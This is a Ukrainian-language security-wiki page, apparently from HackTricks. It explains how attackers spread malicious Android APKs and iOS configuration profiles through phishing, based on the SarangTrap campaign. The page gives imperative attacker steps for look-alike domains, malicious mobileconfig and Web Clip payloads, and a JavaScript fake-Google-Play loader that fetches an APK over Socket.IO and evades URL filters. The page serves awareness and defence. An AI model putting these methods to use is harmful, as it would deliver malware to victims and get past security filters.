# Мобільний фішинг і розповсюдження шкідливих застосунків (Android та iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> На цій сторінці описано методи, які зловмисники використовують для розповсюдження **шкідливих Android APK** та **профілів конфігурації iOS** через фішинг (SEO, соціальна інженерія, підроблені магазини, застосунки для знайомств тощо).
> Матеріал адаптовано з викритої кампанії SarangTrap, про яку повідомили Zimperium zLabs (2025), та інших відкритих досліджень.<sup>[[1]](#references)</sup>

## Схема атаки

1. **SEO/фішингова інфраструктура**
   * Зареєструйте десятки доменів, схожих на справжні (знайомства, хмарний обмін файлами, автосервіс тощо).  
     – Використовуйте ключові слова місцевою мовою та емодзі в елементі `<title>`, щоб піднятися в результатах Google.  
     – Розміщуйте інструкції з інсталяції як для Android (`.apk`), так і для iOS на одній цільовій сторінці.
2. **Завантаження першого етапу**
   * Android: пряме посилання на *непідписаний* APK або APK із «стороннього магазину».  
   * iOS: посилання `itms-services://` або звичайне HTTPS-посилання на шкідливий профіль **mobileconfig** (див. нижче).
3. **Поведінка Android після інсталяції**
   * Виконання під контролем C2, зловживання дозволами, обходи dropper, збирання даних у фоновому режимі та інші аспекти роботи шкідливого ПЗ після інсталяції розглянуто на окремій сторінці Android Malware Post-Exploitation нижче.
4. **Метод доставки для iOS**
   * Один **профіль конфігурації mobile** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб зарахувати пристрій до нагляду на кшталт «MDM».  
   * Інструкції із соціальної інженерії:
     1. Відкрийте Settings ➜ *Профіль завантажено*.
     2. Тричі натисніть *Інсталювати* (на сторінці фішингу є знімки екрана).  
     3. Довіртеся непідписаному профілю ➜ зловмисник отримує права на *Контакти* й *Фото* без перевірки App Store.
5. **Корисне навантаження Web Clip для iOS (іконка фішингового застосунку)**
   * Корисне навантаження `com.apple.webClip.managed` може **закріпити фішингову URL-адресу на головному екрані** з брендованою іконкою/назвою.
   * Web Clips можуть запускатися **на весь екран** (приховуючи інтерфейс браузера) і позначатися як **невидалювані**, змушуючи жертву видалити профіль, щоб прибрати іконку.<sup>[[3]](#references)</sup>
6. **Мережевий рівень**
   * Звичайний HTTP, часто через порт 80, із заголовком HOST на кшталт `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).

## Android Malware Post-Exploitation

Щоб дізнатися про методи Android malware після інсталяції, зокрема C2, зловживання Accessibility, оверлеї, автоматизацію ATS, завантаження DEX поетапно, premium SMS і закріплення в системі, дивіться:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK Smuggling на основі Socket.IO/WebSocket і підроблені сторінки Google Play

Зловмисники дедалі частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у приманки, що імітують Google Play. Це приховує URL-адресу корисного навантаження, обходить фільтри URL-адрес і розширень та забезпечує реалістичний процес інсталяції.<sup>[[2]](#references)[[4]](#references)</sup>

Типовий потік дій клієнта, зафіксований у реальних випадках:

<details>
<summary>Підроблений завантажувач Play на Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Чому це обходить прості засоби контролю:
- Статична URL-адреса APK не розкривається; payload відновлюється в пам’яті з кадрів WebSocket.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть пропустити двійкові дані, що передаються через WebSockets/Socket.IO.
- Краулери та URL-пісочниці, які не виконують WebSockets, не отримають payload.

Див. також практичні прийоми та інструменти WebSocket:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Темний бік романтики: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Банківський троян, націлений на користувачів Android в Індонезії та В’єтнамі](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
